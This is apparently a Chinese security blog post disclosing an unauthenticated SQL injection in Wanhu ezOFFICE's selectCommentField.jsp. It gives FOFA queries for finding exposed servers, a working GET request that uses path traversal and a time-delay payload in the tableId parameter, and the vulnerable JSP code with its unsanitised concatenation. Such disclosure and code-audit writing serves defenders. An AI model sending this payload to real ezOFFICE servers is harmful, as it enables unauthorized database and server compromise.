---
title: "万户ezOFFICE selectCommentField.jsp SQL注入漏洞"
source: https://mrxn.net/jswz/defaultroot-ezOFFICE-selectCommentField-tableId-sqli.html
asset_dir: assets/万户ezoffice-selectcommentfield.jsp-sql注入漏洞
---

# 万户ezOFFICE selectCommentField.jsp SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/3/18 08:31
- 1294浏览
- [0评论](#comment)
- 27分钟阅读

深入探索

技术文章订阅

网络安全培训

授权

---

# 0x01 产品简介

万户OA [ezoffice](https://mrxn.net/tag/ezoffice "ezoffice") 是万户网络协同办公产品多年来一直将主要精力致力于中高端市场的一款OA协同办公[软件](#)产品，统一的基础管理平台，实现用户数据统一管理、权限统一分配、身份统一认证。统一规划门户网站群和协同办公平台，将外网信息维护、客户服务、互动交流和日常工作紧密结合起来，有效提高工作效率。

SQL注入检测工具

# 0x02 漏洞概述

万户 ezOFFICE platform/platform/custom/custom\_database/dropdownselect/selectCommentField.jsp 接口存在[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞，未授权的攻击者可利用此[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")获取数据库权限，深入利用可获取服务器权限。

# 0x03 复现环境

本地环境 OR FOFA：app="ezOFFICE协同管理平台" || app="万户ezOFFICE协同管理平台" || app="万户网络-ezOFFICE"

深入探索

文本剥离工具

防火墙软件

云安全解决方案

# 漏洞复现

```
GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../platform/custom/custom_database/dropdownselect/selectCommentField.jsp?tableId=1+waitfor+delay+'0:0:6'--+- HTTP/1.1
Host: ezoffice.mrxn.net
```

成功延时 6 秒

代码安全审计

[![万户ezOFFICE selectCommentField.jsp SQL注入漏洞](images/img-001-b91bb9025653.webp)](https://image.mrxn.net/d861d8e6664e49b6b06f7f7504e1aafb.webp)

# 漏洞分析

> 关于鉴权绕过，参考这篇文章：[万户 ezOFFICE ajax\_checkUserNum.jsp SQL注入漏洞](https://mrxn.net/jswz/defaultroot-ezOFFICE-ajax_checkUserNum-sqli.html)
>
> 漏洞预警服务

selectCommentField.jsp 主要业务逻辑代码如下，非常简单！

深入探索

安全

企业安全咨询

传输层安全性协议

```
<%@ page contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ include file="/public/include/init.jsp"%>
<%@ page import="com.whir.ezoffice.customdb.customdb.bd.CustomDatabaseBD" %>
<%
String tableId = request.getParameter("tableId");
String index = request.getParameter("index");
String val = request.getParameter("val");
if (val == null || "null".equals(val)) {
    val = "";
}

java.sql.Connection conn = null;
java.sql.Statement stmt = null;

java.util.List list = new java.util.ArrayList();
Object[] obj;
try {
    conn = new com.whir.common.util.DataSourceBase().getDataSource().getConnection();
    stmt = conn.createStatement();
    java.sql.ResultSet rs = stmt.executeQuery("select field_name,field_desname from tfield where (field_show=401) and field_table="+ tableId + " order by field_id");
    while (rs.next()) {
        obj = new String[2];
        obj[0] = rs.getString(1);
        obj[1] = rs.getString(2);
        list.add(obj);
    }
    rs.close();
    stmt.close();
} catch (Exception ex) {
} finally {
    if (conn != null) {
        conn.close();
    }
}
%>
    <select onchange="setSelectObj(this,'<%=index%>');" class="selectlist" style="width:50%;">
        <option value=""></option>
        <%
        if(list.size()>0){
          for(int i=0;i<list.size();i++){   
            obj=(Object[])list.get(i);  
        %>
          <option value="<%=obj[0].toString()%>" <%if(val.trim().equals(obj[0].toString().trim())){out.print("selected");}%>><%=obj[1].toString()%></option>
        <%}
        }%>
    </select>
```

主要关注 这一行

物流软件安全

```
java.sql.ResultSet rs = stmt.executeQuery("select field_name,field_desname from tfield where (field_show=401) and field_table="+ tableId + " order by field_id");
```

又是一个明显的直将 `tableId` 参数拼接进SQL语句，造成[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞，还是这么朴实无华！

# 最后

其他万户OA 相关漏洞  
[万户 ezOFFICE selectAmountField.jsp SQL注入漏洞](https://mrxn.net/jswz/defaultroot-ezOFFICE-selectAmountField-sqli.html)  
[万户OA系列漏洞](https://mrxn.net/tag/ezoffice)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#ezOFFICE](https://mrxn.net/tag/ezOFFICE)

---

文章目录

- [1.0x01 产品简介](#toc-1-)
- [2.0x02 漏洞概述](#toc-2-)
- [3.0x03 复现环境](#toc-3-)
- [4.漏洞复现](#toc-4-)
- [5.漏洞分析](#toc-5-)
- [6.最后](#toc-6-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
